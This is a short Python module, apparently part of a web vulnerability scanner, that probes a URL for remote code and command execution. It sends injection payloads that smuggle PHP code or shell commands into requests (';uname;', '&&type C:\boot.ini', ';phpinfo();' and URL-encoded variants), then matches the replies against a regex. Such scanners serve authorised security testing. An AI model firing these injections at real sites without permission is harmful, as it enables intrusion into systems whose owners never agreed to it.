from vulnz import main_function
import re
from headers import *

def rce_func(url):
    headers_reader(url)
    print(ga.bold + " [!] Now Scanning for Remote Code/Command Execution " + ga.end)
    print(ga.blue + " [!] Covering Linux & Windows Operating Systems " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)

    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']

    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    main_function(url, payloads, check)
